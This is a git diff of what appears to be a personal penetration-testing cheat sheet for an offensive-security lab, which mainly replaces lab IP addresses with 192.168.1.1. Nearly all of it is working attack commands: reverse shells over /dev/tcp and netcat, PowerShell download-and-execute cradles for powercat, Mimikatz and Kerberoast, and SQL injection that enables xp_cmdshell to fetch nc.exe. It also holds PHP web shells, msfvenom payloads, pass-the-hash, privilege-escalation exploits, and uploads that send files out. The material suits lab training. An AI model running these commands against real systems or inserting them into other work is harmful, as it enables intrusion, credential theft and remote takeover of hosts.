@@ -92,7 +92,7 @@ C:\Windows\repair\system
 ## PHP cmd injection
 ```
 <?php system("whoami"); ?>
-<?php system("bash -i >& /dev/tcp/192.168.49.56/80 0>&1"); ?>
+<?php system("bash -i >& /dev/tcp/192.168.1.1/80 0>&1"); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
 ```
@@ -112,8 +112,15 @@ $(command)
 
 ## XSS 
 ```
-<iframe src=http://192.168.119.243/mHxH2w height="0" width="0">
-<iframe src=http://192.168.119.243/MmVIPvoTOI>
+<iframe src=http://192.168.1.1/mHxH2w height="0" width="0">
+<iframe src=http://192.168.1.1/MmVIPvoTOI>
+```
+
+## Phpmyadmin
+```
+create new database, go SQL tabs
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\cmd.php" 
+access through webpage
 ```
 
 ## SQL login/ Injection
@@ -145,7 +152,7 @@ RECONFIGURE
 sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
-EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.243:80/powercat.ps1");powercat -c 192.168.119.243 -p 443 -e cmd | powershell -noprofile'
+EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.1:80/powercat.ps1");powercat -c 192.168.1.1 -p 443 -e cmd | powershell -noprofile'
 ```
 Injections
 ```
@@ -164,8 +171,8 @@ tom' or 1=1 #
 
 ';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
 ';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
-';EXEC xp_cmdshell "powershell.exe wget http://192.168.119.243:80/nc.exe -OutFile c:\\Users\Public\\nc.exe";--
-';EXEC xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.119.243 443";--
+';EXEC xp_cmdshell "powershell.exe wget http://192.168.1.1:80/nc.exe -OutFile c:\\Users\Public\\nc.exe";--
+';EXEC xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.1.1 443";--
 
 # Error based:
 ',CONVERT(INT,@@version))--
@@ -207,7 +214,7 @@ sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24
 ssh -f -N -D 9050 sean@10.11.1.251
 
 ssh -N -R 127.0.0.1:5555:127.0.0.1:4444 victim@10.1.1.1 -f             ("their ip":port:"our ip":port) - receiving reverse shell
-ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.119.243 -f        ("our ip":port:"their ip":port) - connecting server
+ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.1.1 -f            ("our ip":port:"their ip":port) - connecting server
 
 plink.exe -ssh -l kali -pw password -R 127.0.0.1:3389:172.16.1.1:3389 192.168.1.1
 plink.exe -ssh -l kali -i id_rsa.ppk -R 127.0.0.1:3389:172.16.1.1:3389 192.168.1.1
@@ -244,66 +251,66 @@ xdg-open ftp://
 ## Mount/connect share
 Linux
 ```
-showmount -e 10.11.1.136
-sudo mount -t cifs //10.11.1.136/'Bob Share' /tmp/lol
+showmount -e 10.11.1.1
+sudo mount -t cifs //10.11.1.1/'Bob Share' /tmp/lol
 sudo mount -o port=5555 -t nfs 127.0.0.1:/srv/Share /tmp/lol
 
-smbclient -N //10.2.2.23/ADMIN$             (connect smb share)
-smbclient -U '%' -N \\\\10.2.2.23\\ADMIN$ 
+smbclient -N //10.2.1.1/ADMIN$             (connect smb share)
+smbclient -U '%' -N \\\\10.2.1.1\\ADMIN$ 
 ```
 Windows
 ```
-net use * \\192.168.119.142\lolll
+net use * \\192.168.1.1\lolll
 \\MAIL\Users\eric\Desktop\reverseshell64.exe
-\\\\10.11.1.229\\share\\reverseshell64.exe
+\\\\10.11.1.1\\share\\reverseshell64.exe
 ```
 
 ## Linux transfer file methods
 Download
 ```
-wget http://192.168.119.243:80/linpeas.sh
-curl http://192.168.119.243:80/linpeas.sh -o linpeas.sh
+wget http://192.168.1.1:80/linpeas.sh
+curl http://192.168.1.1:80/linpeas.sh -o linpeas.sh
 ftp offsec:offsec
 ```
 Upload
 ```
-scp flag.txt kali@192.168.119.243:/home/kali
+scp flag.txt kali@192.168.1.1:/home/kali
 ftp offsec:offsec
 ```
 
 ## Windows transfer file methods
 Download
 ```
-powershell.exe -ExecutionPolicy Bypass "Start-BitsTransfer -Source 'http://192.168.119.243:80/winPEASx64.exe'" -Destination C:\
-powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest -URI 'http://192.168.119.243:80/winPEASx64.exe'" -OutFile C:\
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.243:80/winPEASx64.exe', 'winPEASx64.exe')
-certutil.exe -urlcache -f http://192.168.119.243:80/winPEASx64.exe winPEASx64.exe
-wget http://192.168.119.243:80/winPEASx64.exe
-curl http://192.168.119.243:80/winPEASx64.exe
-bitsadmin /transfer pwn /download http://192.168.119.243:80/winPEASx64.exe
+powershell.exe -ExecutionPolicy Bypass "Start-BitsTransfer -Source 'http://192.168.1.1:80/winPEASx64.exe'" -Destination C:\
+powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest -URI 'http://192.168.1.1:80/winPEASx64.exe'" -OutFile C:\
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1:80/winPEASx64.exe', 'winPEASx64.exe')
+certutil.exe -urlcache -f http://192.168.1.1:80/winPEASx64.exe winPEASx64.exe
+wget http://192.168.1.1:80/winPEASx64.exe
+curl http://192.168.1.1:80/winPEASx64.exe
+bitsadmin /transfer pwn /download http://192.168.1.1:80/winPEASx64.exe
 ```
 Direct execution from Powershell
 ```
-powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
-powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
-powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"kerberos::list /export"'"
-powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
-powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
+powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.1.1:80/powercat.ps1');powercat -c 192.168.1.1 -p 443 -e cmd"
+powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.1.1:80/PowerUp.ps1');Invoke-AllChecks"
+powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.1.1:80/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"kerberos::list /export"'"
+powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.1.1:80/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
+powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.1.1:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
 ```
 Upload
 ```
-powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.243/uploads.php', 'system')      (need start apache2)
-pscp.exe flag.txt kali@192.168.119.243:/home/kali
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.1.1/uploads.php', 'system')      (need start apache2)
+pscp.exe flag.txt kali@192.168.1.1:/home/kali
 ftp offsec:offsec
 ```
 SMB server (download&upload)
 ```
 kali: impacket-smbserver lolll . 
-victim: net use * \\192.168.119.243\lolll
+victim: net use * \\192.168.1.1\lolll
 
 copy Z:\nc64.exe
 xcopy Z:\Recon /E                                           (recursive)
-Z:\nc64.exe -nc 192.168.119.243 443 -e cmd.exe              (direct execution)
+Z:\nc64.exe -nc 192.168.1.1 443 -e cmd.exe                  (direct execution)
 ```
 
 ## Reverse shell
@@ -335,24 +342,24 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen($c,r
 ```
 Windows
 ```
-powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
-nc64.exe -nv 192.168.119.243 443 -e cmd.exe
-Z:\nc64.exe -nv 192.168.119.243 443 -e cmd.exe
+powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.1.1:80/powercat.ps1');powercat -c 192.168.1.1 -p 443 -e cmd"
+nc64.exe -nv 192.168.1.1 443 -e cmd.exe
+Z:\nc64.exe -nv 192.168.1.1 443 -e cmd.exe
 ```
 ### Files
 Msfvenom
 ```
 # Stageless
 32bit:
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o reverseshell64.exe
 
 # Staged
 32bit:
-msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
-msfvenom -a x64 --platform Windows -p windows/x64/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe
+msfvenom -a x64 --platform Windows -p windows/x64/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o reverseshell64.exe
 
 add followings if needed:
 EXITFUNC=thread, -b "\x00\x0a\x0d\x25\x26\x2b\x3d", –e x86/shikata_ga_nai, -i 20
@@ -382,7 +389,7 @@ Windows
 systeminfo
 whoami /all
 winPEASx64.exe
-powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
+powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.1.1:80/PowerUp.ps1');Invoke-AllChecks"
 net user
 net localgroup administrators
 netstat -ano
@@ -394,8 +401,8 @@ shutdown /r /t 0
 AD
 ```
 # Direct execution
-powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
-powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.227:5556/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
+powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.1.1:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
+powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.1.1:5556/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
 
 # Import modules Powerview
 $env:PSModulePath -split ';'                  (modules path)
@@ -455,7 +462,7 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
 xfreerdp /u:"username" /v:IP:3389
 
 # Pth Winexe/Psexec/Smb
-pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.248 cmd.exe
+pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.1 cmd.exe
 impacket-psexec -hashes 00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 tomahawk@10.1.1.248
 
 # WinRm (port 5985,5986)
@@ -507,7 +514,7 @@ show variables like '%plugin%';
 select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 create function do_system returns integer soname 'raptor_udf2.so';
 select * from mysql.func;
-select do_system('bash -c "bash -i >& /dev/tcp/192.168.119.243/443 0>&1"');
+select do_system('bash -c "bash -i >& /dev/tcp/192.168.1.1/443 0>&1"');
 ```
 Windows
 ```
@@ -518,8 +525,8 @@ PsExec64.exe -i -accepteula -d -s C:\Users\nicky\AppData\Local\Temp\reverseshell
 # SeImpersonatePrivilege
 PrintSpoofer64.exe -i -c cmd.exe
 PrintSpoofer64.exe -i -c C:\Users\nicky\AppData\Local\Temp\reverseshell64.exe
-JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
-JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
+JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.1.1 443 -e cmd.exe" 
+JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.1.1 443 -e cmd.exe" 
 
 # BypassUAC
 https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
@@ -527,7 +534,7 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\Ap
 powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
 
 # Service unquoted path 
-sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168.119.243 443 -e cmd.exe"
+sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168.1.1 443 -e cmd.exe"
 sc qc usosvc
 shutdown /r /t 0
 
@@ -541,13 +548,6 @@ net localgroup "Remote Desktop Users" Bill /add
 
 # Print proof
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
-```
-
-##Phpmyadmin
-```
-create new database, go SQL tabs
-SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\cmd.php" 
-access through webpage
 ```
 
 ## Post exploitation 
@@ -578,9 +578,9 @@ nasm > jmp esp
 !mona find -s "\xff\xe4" -m "libspp.dll"
 
 Common payloads:
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f c
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f py -v shellcode
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f raw
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00\x0a\x0d\xff" -f c
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00\x0a\x0d\xff" -f py -v shellcode
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00\x0a\x0d\xff" -f raw
 ```
 
 
